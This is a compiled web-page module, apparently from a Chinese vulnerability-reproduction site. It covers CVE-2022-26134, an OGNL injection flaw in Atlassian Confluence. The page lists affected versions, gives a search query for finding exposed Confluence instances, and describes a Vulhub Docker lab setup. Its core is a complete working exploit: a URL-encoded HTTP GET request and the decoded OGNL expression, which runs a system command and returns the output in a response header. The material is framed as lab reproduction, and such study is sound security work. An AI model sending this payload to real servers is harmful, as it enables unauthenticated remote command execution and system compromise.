import{_ as s}from"./plugin-vue_export-helper-c27b6911.js";import{r as l,o,c,a as e,b as n,d as t,e as i}from"./app-58e4a7d6.js";const d={},r=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),u=e("p",null,"Atlassian Confluence是企业广泛使用的wiki系统。2022年6月2日Atlassian官方发布了一则安全更新，通告了一个严重且已在野利用的代码执行漏洞，攻击者利用这个漏洞即可无需任何条件在Confluence中执行任意命令。",-1),h=e("p",null,"参考链接：",-1),m={href:"https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html",target:"_blank",rel:"noopener noreferrer"},p={href:"https://attackerkb.com/topics/BH1D56ZEhs/cve-2022-26134/rapid7-analysis",target:"_blank",rel:"noopener noreferrer"},v=i(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Atlassian Confluence 7.4.17
Atlassian Confluence 7.13.7
Atlassian Confluence 7.14.3
Atlassian Confluence 7.15.2
Atlassian Confluence 7.16.4
Atlassian Confluence 7.17.4
Atlassian Confluence 7.18.1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;ATLASSIAN-Confluence&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动一个Confluence Server 7.13.6：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,7),_=e("code",null,"http://your-ip:8090",-1),b={href:"https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2019-3396",target:"_blank",rel:"noopener noreferrer"},g=e("code",null,"db",-1),f=e("code",null,"confluence",-1),x=e("code",null,"postgres",-1),C=i(`<h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>该漏洞利用方法十分简单，直接发送如下请求即可执行任意命令，并在HTTP返回头中获取执行结果：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1
Host: your-ip:8090
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>其中使用到的OGNL表达式为：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>\${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&quot;id&quot;).getInputStream(),&quot;utf-8&quot;)).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(&quot;X-Cmd-Response&quot;,#a))}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202206061458141.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,6);function A(k,y){const a=l("ExternalLinkIcon");return o(),c("div",null,[r,u,h,e("ul",null,[e("li",null,[e("a",m,[n("https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html"),t(a)])]),e("li",null,[e("a",p,[n("https://attackerkb.com/topics/BH1D56ZEhs/cve-2022-26134/rapid7-analysis"),t(a)])])]),v,e("p",null,[n("环境启动后，访问"),_,n("即可进入安装向导，参考"),e("a",b,[n("CVE-2019-3396"),t(a)]),n("这个环境中的安装方法，申请试用版许可证。在填写数据库信息的页面，PostgreSQL数据库地址为"),g,n("，数据库名称"),f,n("，用户名密码均为"),x,n("。")]),C])}const L=s(d,[["render",A],["__file","Atlassian Confluence OGNL表达式注入命令执行漏洞 CVE-2022-26134.html.vue"]]);export{L as default};
